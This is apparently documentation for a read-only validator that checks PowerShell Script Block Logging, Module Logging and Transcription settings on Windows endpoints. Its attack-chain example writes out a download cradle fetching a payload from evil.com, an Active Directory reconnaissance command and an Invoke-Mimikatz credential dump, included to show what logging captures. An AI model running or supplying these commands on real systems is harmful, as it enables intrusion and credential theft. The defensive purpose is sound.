# PowerShell Security and Logging Validator

**Category**: Cyber Hygiene / Configuration Validation
**Severity**: High
**MITRE ATT&CK**: T1059.001, T1027, T1140, T1105

## Description

This cyber-hygiene test validates that PowerShell security controls and comprehensive logging are properly configured on Windows endpoints. PowerShell abuse (MITRE ATT&CK T1059.001) is consistently the most frequently observed attack technique, with over 46,155 documented instances in 2024 threat reports. Every major APT group and commodity malware uses PowerShell for initial access, execution, and post-exploitation activities.

The test performs READ-ONLY validation of the following configurations:
1. **Script Block Logging** - Logs all PowerShell script blocks that are processed
2. **Module Logging** - Logs pipeline execution details for PowerShell modules
3. **Transcription** - Creates text transcripts of all PowerShell sessions
4. **Constrained Language Mode** (informational) - Restricts PowerShell capabilities

## Technical Details

### Attack Flow

This is a configuration validation test, not an attack simulation. The test flow:

1. **Phase 0 - Initialization**
   - Initialize logging framework
   - Create C:\F0 directory for logs
   - Set up Schema v2.0 metadata

2. **Phase 1 - Registry Logging Check**
   - Check Script Block Logging registry key
   - Check Module Logging registry key
   - Check Transcription registry key

3. **Phase 2 - Module Names Check**
   - Verify ModuleNames includes `*` for comprehensive logging
   - Optional enhancement for complete coverage

4. **Phase 3 - Language Mode Check (Informational)**
   - Query PowerShell for current language mode
   - Report but do not fail on FullLanguage mode

5. **Phase 4 - Analysis**
   - Aggregate results from all checks
   - Determine compliance status
   - Generate remediation guidance if non-compliant

### Registry Paths Checked

| Setting | Registry Path |
|---------|---------------|
| Script Block Logging | `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging` |
| Module Logging | `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\EnableModuleLogging` |
| Module Names | `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames` |
| Transcription | `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription\EnableTranscripting` |

### Key Indicators

- Registry reads to PowerShell policy keys
- PowerShell process executing language mode query
- No file drops, no network connections
- All operations are read-only

## Detection Opportunities

1. **Configuration Compliance**
   - Primary detection point: Are all 3 critical logging settings enabled?
   - Binary result: Compliant (126) or Non-Compliant (101)

2. **Process Activity**
   - Test spawns PowerShell to check language mode
   - Parent-child relationship: test binary -> powershell.exe

## Expected Results

### Compliant System (Code 126)

When all critical PowerShell logging settings are properly configured:
- Script Block Logging = 1 (Enabled)
- Module Logging = 1 (Enabled)
- Transcription = 1 (Enabled)

The test outputs:
```
[+] RESULT: COMPLIANT - All critical PowerShell logging settings are enabled
    PowerShell activity will be logged to Windows Event Log:
    - Event ID 4103: Module Logging events
    - Event ID 4104: Script Block Logging events
```

### Non-Compliant System (Code 101)

When one or more critical logging settings are disabled or not configured:

The test outputs:
```
[!] RESULT: NON-COMPLIANT - X critical logging setting(s) need remediation
    PowerShell-based attacks may go undetected!

REMEDIATION:
  Configure via Group Policy:
  Computer Configuration > Administrative Templates > Windows Components
  > Windows PowerShell
  ...
```

### Error Condition (Code 999)

If the test encounters an unexpected error:
- Unable to access registry
- PowerShell execution fails
- System panic/exception

## Why PowerShell Logging Matters

### Without Logging
- Attackers execute scripts undetected
- Encoded commands bypass basic analysis
- No forensic evidence of malicious activity
- Incident response severely hampered

### With Logging Enabled
- All script blocks captured (even obfuscated)
- Module pipeline activity recorded
- Session transcripts available for analysis
- Enables detection rules and threat hunting

### Real-World Attack Chain Example

A typical attack that PowerShell logging would capture:

```powershell
# Stage 1: Download cradle (captured by Script Block Logging)
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# Stage 2: Reconnaissance (captured by Module Logging)
Get-ADComputer -Filter * | Select-Object Name, OperatingSystem

# Stage 3: Credential theft (captured by Transcription)
Invoke-Mimikatz -DumpCreds
```

Without these logging settings, this entire attack chain would be invisible to defenders.

## Constrained Language Mode Note

The test reports Constrained Language Mode (CLM) as informational only because:
- CLM can break legitimate administrative scripts
- Many organizations cannot deploy CLM enterprise-wide
- CLM requires careful planning and testing
- The 3 logging settings are the critical minimum requirement

Organizations with high security requirements should consider CLM deployment as an additional layer of defense.
